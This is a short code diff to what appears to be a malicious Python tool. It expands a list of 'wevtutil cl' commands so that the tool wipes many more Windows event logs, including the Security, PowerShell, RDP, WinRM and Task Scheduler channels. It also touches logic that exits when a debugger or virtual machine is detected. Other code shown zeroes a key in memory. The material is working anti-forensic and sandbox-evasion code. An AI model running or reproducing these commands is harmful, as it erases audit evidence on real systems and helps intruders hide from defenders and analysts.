@@ -107,7 +107,18 @@ def attempt_rem_event_logs():
     win_commands = [
         "wevtutil cl System",
         "wevtutil cl Security",
-        "wevtutil cl Application"
+        "wevtutil cl Application",
+        "wevtutil cl Setup",
+        "wevtutil cl ForwardedEvents",
+        "wevtutil cl Microsoft-Windows-TaskScheduler/Operational",
+        "wevtutil cl Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
+        "wevtutil cl Microsoft-Windows-WindowsUpdateClient/Operational",
+        "wevtutil cl Microsoft-Windows-GroupPolicy/Operational",
+        "wevtutil cl Microsoft-Windows-PowerShell/Operational",
+        "wevtutil cl Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational",
+        "wevtutil cl Microsoft-Windows-Security-Auditing",
+        "wevtutil cl Microsoft-Windows-WinRM/Operational",
+        "wevtutil cl Windows PowerShell"
     ]
     
     for command in win_commands:
@@ -261,7 +272,8 @@ def check_debugging_and_virtualization():
         pass
 
     if debugging or virtualization:
-        sys.exit()  # Exit if debugging or virtualization detected
+        # Exit if debugging or virtualization detected
+        sys.exit() 
 
 # Zero out the key in memory several times
 def zero_memory(buffer):
